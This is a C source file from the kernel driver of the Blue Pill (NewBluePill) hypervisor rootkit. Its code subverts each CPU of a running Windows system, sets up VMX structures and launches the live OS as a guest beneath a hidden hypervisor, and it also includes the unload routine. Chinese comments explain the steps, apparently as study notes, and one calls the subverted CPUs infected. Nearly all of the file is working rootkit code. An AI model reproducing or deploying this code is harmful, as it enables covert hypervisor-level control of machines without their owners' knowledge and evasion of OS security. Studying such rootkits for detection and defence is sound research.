/* 
 * Copyright holder: Invisible Things Lab
 */

#include "hvm.h"
#include "hypercalls.h"
#include "traps.h"
#include "interrupts.h"

KMUTEX g_HvmMutex;

ULONG g_uSubvertedCPUs;
ULONG g_uPrintStuff;
extern BOOLEAN g_bDisableComOutput;

PHVM_DEPENDENT Hvm;

VOID NTAPI VmExitHandler (
  PCPU Cpu,
  PGUEST_REGS GuestRegs
)
{
    if (!Cpu || !GuestRegs)
        return;

    VmxHandleInterception (Cpu, GuestRegs, FALSE);
}

static NTSTATUS HvmSetupGdt (
  PCPU Cpu
)
{
  ULONG64 GuestTssBase;
  USHORT GuestTssLimit;
  PSEGMENT_DESCRIPTOR GuestTssDescriptor;

  if (!Cpu || !Cpu->GdtArea)
    return STATUS_INVALID_PARAMETER;

#if DEBUG_LEVEL>2
  CmDumpGdt ((PUCHAR) GetGdtBase (), 0x67);     //(USHORT)GetGdtLimit());
#endif

  // set code and stack selectors the same with NT to simplify our unloading
  CmSetGdtEntry (Cpu->GdtArea,
                 BP_GDT_LIMIT,
                 BP_GDT64_CODE,
                 0, 0, LA_STANDARD | LA_DPL_0 | LA_CODE | LA_PRESENT | LA_READABLE | LA_ACCESSED, HA_LONG);

  // we don't want to have a separate segment for DS and ES. They will be equal to SS.
  CmSetGdtEntry (Cpu->GdtArea,
                 BP_GDT_LIMIT,
                 BP_GDT64_DATA,
                 0, 0xfffff, LA_STANDARD | LA_DPL_0 | LA_PRESENT | LA_WRITABLE | LA_ACCESSED, HA_GRANULARITY | HA_DB);

  // fs
  CmSetGdtEntry (Cpu->GdtArea,
                 BP_GDT_LIMIT,
                 KGDT64_R3_CMTEB, 0, 0x3c00, LA_STANDARD | LA_DPL_3 | LA_PRESENT | LA_WRITABLE | LA_ACCESSED, HA_DB);

  // gs
  CmSetGdtEntry (Cpu->GdtArea,
                 BP_GDT_LIMIT,
                 KGDT64_R3_DATA,
                 0, 0xfffff, LA_STANDARD | LA_DPL_3 | LA_PRESENT | LA_WRITABLE | LA_ACCESSED, HA_GRANULARITY | HA_DB);

  GuestTssDescriptor = (PSEGMENT_DESCRIPTOR) (GetGdtBase () + GetTrSelector ());

  GuestTssBase = GuestTssDescriptor->BaseLow | GuestTssDescriptor->BaseMid << 16 | GuestTssDescriptor->BaseHigh << 24;
  GuestTssLimit = GuestTssDescriptor->LimitLow | GuestTssDescriptor->LimitHigh << 16;
  if (GuestTssDescriptor->AttributesHigh & 0x8)
    // 4096-bit granularity is enabled for this segment, scale the limit
    GuestTssLimit <<= 12;

  if (!(GuestTssDescriptor->AttributesLow & 0x10)) {
    GuestTssBase  = (*(PULONG64) ((PUCHAR) GuestTssDescriptor + 4)) & 0xffffffffff000000;
    GuestTssBase |= (*(PULONG32) ((PUCHAR) GuestTssDescriptor + 2)) & 0x00ffffff;
  }
#if DEBUG_LEVEL>2
  CmDumpTSS64 ((PTSS64) GuestTssBase, GuestTssLimit);
#endif

  // don't need to reload TR - we use 0x40, as in xp/vista.
  CmSetGdtEntry (Cpu->GdtArea, BP_GDT_LIMIT, BP_GDT64_SYS_TSS, (PVOID) GuestTssBase, GuestTssLimit,     //BP_TSS_LIMIT,
                 LA_BTSS64 | LA_DPL_0 | LA_PRESENT | LA_ACCESSED, 0);

  // so far, we have 5 GDT entries.
  // 0x10: CODE64         cpl0                                            CS
  // 0x18: DATA           dpl0                                            DS, ES, SS
  // 0x28: DATA           dpl3                                            GS
  // 0x40: Busy TSS64, base is equal to NT TSS    TR
  // 0x50: DATA           dpl3                                            FS

#if DEBUG_LEVEL>2
  CmDumpGdt ((PUCHAR) Cpu->GdtArea, BP_GDT_LIMIT);
#endif

  CmReloadGdtr (Cpu->GdtArea, BP_GDT_LIMIT);

  // set new DS and ES
  CmSetBluepillESDS ();

  // we will use GS as our PCR pointer; GS base will be set to the Cpu in HvmEventCallback
  // FIXME: but it is not?

  return STATUS_SUCCESS;
}

static NTSTATUS HvmSetupIdt (
  PCPU Cpu
)
{
  UCHAR i;

  if (!Cpu || !Cpu->IdtArea)
    return STATUS_INVALID_PARAMETER;

  memcpy (Cpu->IdtArea, (PVOID) GetIdtBase (), 0x1000);

#if 1
  for (i = 0; i < 255; i++)
    CmSetIdtEntry (Cpu->IdtArea, BP_IDT_LIMIT, 0x0d,    // #GP
                   BP_GDT64_CODE, InGeneralProtection, 0, LA_PRESENT | LA_DPL_0 | LA_INTGATE64);
#endif
  CmReloadIdtr (Cpu->IdtArea, BP_IDT_LIMIT);

  return STATUS_SUCCESS;
}

NTSTATUS NTAPI HvmSubvertCpu (
  PVOID GuestRsp
)
{
    NTSTATUS Status;
  PCPU Cpu;
  PVOID HostKernelStackBase;
  PHYSICAL_ADDRESS t;

  KdPrint (("HvmSubvertCpu(): Running on processor #%d\n", KeGetCurrentProcessorNumber ()));

  // 为Guest分配内核栈(按页分配), 大小与Host相同
  HostKernelStackBase = ExAllocatePoolWithTag (NonPagedPool, HOST_STACK_SIZE_IN_PAGES * PAGE_SIZE, ITL_TAG);
  if (!HostKernelStackBase)
  {
      KdPrint (("HvmSubvertCpu(): Failed to allocate host stack!\n"));
      return STATUS_INSUFFICIENT_RESOURCES;
  }
  RtlZeroMemory (HostKernelStackBase, HOST_STACK_SIZE_IN_PAGES * PAGE_SIZE);

  //
  // 设置Cpu数据结构的内存地址为 [栈顶-8h-sizeof(CPU)]
  //
  Cpu = (PCPU) ((PCHAR) HostKernelStackBase + HOST_STACK_SIZE_IN_PAGES * PAGE_SIZE - 8 - sizeof (CPU));

  Cpu->HostStack       = HostKernelStackBase;    // 内核栈基址
  Cpu->SelfPointer     = Cpu;                    // 自身的指针
  Cpu->ProcessorNumber = KeGetCurrentProcessorNumber ();  // 当前处理器数量
  Cpu->Nested          = FALSE;                  // TODISCOVER: 是否嵌套

  InitializeListHead (&Cpu->GeneralTrapsList);   // 初始化普通陷入事件记录链
  InitializeListHead (&Cpu->MsrTrapsList);       // 初始化MSR读写陷入事件记录链
  InitializeListHead (&Cpu->IoTrapsList);        // 初始化IO读写陷入事件记录链

  // 为Guest重新分配Gdt
  Cpu->GdtArea = ExAllocatePoolWithTag (NonPagedPool, PAGE_SIZE, ITL_TAG);
  if (!Cpu->GdtArea) {
    KdPrint (("HvmSubvertCpu(): Failed to allocate memory for GDT!\n"));
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  // 为Guest重新分配Idt
  Cpu->IdtArea = ExAllocatePoolWithTag (NonPagedPool, PAGE_SIZE, ITL_TAG);
  if (!Cpu->IdtArea) {
    KdPrint (("HvmSubvertCpu(): Failed to allocate memory for IDT\n"));
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  t.QuadPart = -1;
  Cpu->SparePage = MmAllocateContiguousMemory (PAGE_SIZE, t);
  if (!Cpu->SparePage) {
    KdPrint (("HvmSubvertCpu(): Failed to allocate 1 page for the dummy page (DPA_CONTIGUOUS)\n"));
    return STATUS_UNSUCCESSFUL;
  }
  Cpu->SparePagePA = MmGetPhysicalAddress (Cpu->SparePage);

  // this is valid only for host page tables, as this VA may point into 2mb page in the guest.
  Cpu->SparePagePTE = (PULONG64) ((((ULONG64) (Cpu->SparePage) >> 9) & 0x7ffffffff8) + PT_BASE);

  //
  //  初始化所有VM_EXIT陷入事件对应的处理例程
  //
  Status = VmxRegisterTraps (Cpu);
  if (!NT_SUCCESS (Status)) {
    KdPrint (("HvmSubvertCpu(): Failed to register NewBluePill traps, status 0x%08hX\n", Status));
    return STATUS_UNSUCCESSFUL;
  }

  //
  // 准备VM要用到的数据结构 (VMON Region & VMCS for Intel-Vt)
  // GuestRip和GuestRsp会被填进VMCS结构，代表Guest原本的代码位置和栈顶指针
  //
  Status = VmxInitialize (Cpu, CmResumeGuest, GuestRsp);
  if (!NT_SUCCESS (Status))
  {
    KdPrint (("HvmSubvertCpu(): ArchInitialize() failed with status 0x%08hX\n", Status));
    return Status;
  }

  InterlockedIncrement (&g_uSubvertedCPUs);  // 已侵染的CPU数+=1

#if 0
  Cpu->LapicBaseMsr.QuadPart = __readmsr (MSR_IA32_APICBASE);

  if (Cpu->LapicBaseMsr.QuadPart & MSR_IA32_APICBASE_ENABLE)
  {
    Cpu->LapicPhysicalBase.QuadPart = Cpu->LapicBaseMsr.QuadPart & MSR_IA32_APICBASE_BASE;
    Cpu->LapicVirtualBase = (PVOID) Cpu->LapicPhysicalBase.QuadPart;

    // set VA=PA
    MmCreateMapping (Cpu->LapicPhysicalBase, Cpu->LapicVirtualBase, FALSE);

    _KdPrint (("HvmSubvertCpu(): Local APIC Base PA 0x%08hX, mapped to VA 0x%08hX\n", Cpu->LapicPhysicalBase.QuadPart,
               Cpu->LapicVirtualBase));
  }
  else
  {
    _KdPrint (("HvmSubvertCpu(): Local APIC is disabled\n"));
  }
#endif

  //HvmSetupGdt (Cpu);   // 配置Guest Gdt
  //HvmSetupIdt (Cpu);   // 配置Guest Idt

  // 一切准备工作完毕，使该CPU进入虚拟机
  __vmx_vmlaunch();

  // never reached
  InterlockedDecrement (&g_uSubvertedCPUs);
  return Status;
}


static NTSTATUS NTAPI HvmLiberateCpu (
  PVOID Param
)
{

#ifndef ENABLE_HYPERCALLS

  return STATUS_NOT_SUPPORTED;

#else

  NTSTATUS Status;
  ULONG64 Efer;
  PCPU Cpu;

  if (KeGetCurrentIrql () != DISPATCH_LEVEL)
    return STATUS_UNSUCCESSFUL;

  Efer = __readmsr (MSR_EFER);

  _KdPrint (("HvmLiberateCpu(): Reading MSR_EFER on entry: 0x%X\n", Efer));

  Status = HcMakeHypercall (NBP_HYPERCALL_UNLOAD, 0, NULL);
  if (!NT_SUCCESS (Status)) {
    KdPrint (("HvmLiberateCpu(): HcMakeHypercall() failed on processor #%d, status 0x%08hX\n",
               KeGetCurrentProcessorNumber (), Status));
    return Status;
  }

  Efer = __readmsr (MSR_EFER);
  _KdPrint (("HvmLiberateCpu(): Reading MSR_EFER on exit: 0x%X\n", Efer));

  return STATUS_SUCCESS;
#endif
}

NTSTATUS NTAPI HvmSpitOutBluepill ()
{
#ifndef ENABLE_HYPERCALLS

  return STATUS_NOT_SUPPORTED;

#else

    NTSTATUS Status, CallbackStatus;
    CCHAR i;

  g_bDisableComOutput = TRUE;

  //
  // 获得互斥体g_HvmMutex对象, 保证一时间只有一个HvmSpitOutBluepill函数在执行
  //
  KeWaitForSingleObject (&g_HvmMutex, Executive, KernelMode, FALSE, NULL);

  //
  // 遍历所有处理器
  //
  for (i = 0; i < KeNumberProcessors; i++)
  {
    KdPrint (("HvmSpitOutBluepill(): Liberating processor #%d\n", i));

    //
    // 向每个处理器投递消息，要求执行HvmLiberateCpu, 来通知CPU退出Guest模式
    //
    Status = CmDeliverToProcessor (i, HvmLiberateCpu, NULL, &CallbackStatus);

    //
    // 验证是否投递成功
    //
    if (!NT_SUCCESS (Status)) {
      _KdPrint (("HvmSpitOutBluepill(): CmDeliverToProcessor() failed with status 0x%08hX\n", Status));
    }

    //
    // 验证HvmLiberateCpu是否成功
    //
    if (!NT_SUCCESS (CallbackStatus)) {
      _KdPrint (("HvmSpitOutBluepill(): HvmLiberateCpu() failed with status 0x%08hX\n", CallbackStatus));
    }
  }

  KeReleaseMutex (&g_HvmMutex, FALSE);
  return STATUS_SUCCESS;
#endif
}

NTSTATUS NTAPI HvmSwallowBluepill ()
{
    NTSTATUS Status, CallbackStatus;
    CCHAR i;
    KIRQL OldIrql;

  KeWaitForSingleObject (&g_HvmMutex, Executive, KernelMode, FALSE, NULL);

  // 遍历所有处理器
  for (i = 0; i < KeNumberProcessors; i++)
  {
    KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // 将代码运行在指定CPU
    OldIrql = KeRaiseIrqlToDpcLevel ();

    Status = CmSubvert (NULL);  // CmSubvert的流程是保存所有寄存器(除了段寄存器)的内容到栈里后，调用HvmSubvertCpu

    KeLowerIrql (OldIrql);
    KeRevertToUserAffinityThread ();

    if (Status)
    {
      KdPrint (("HvmSwallowBluepill(): HvmSubvertCpu() failed with status 0x%08hX\n", Status));

      KeReleaseMutex (&g_HvmMutex, FALSE);
      HvmSpitOutBluepill ();
      return Status;
    }
  }

  KeReleaseMutex (&g_HvmMutex, FALSE);

  //
  // 如果没有对每个核都侵染成功，则撤销更改
  //
  if (KeNumberProcessors != g_uSubvertedCPUs)
  {
    HvmSpitOutBluepill ();
    return STATUS_UNSUCCESSFUL;
  }

  return STATUS_SUCCESS;
}
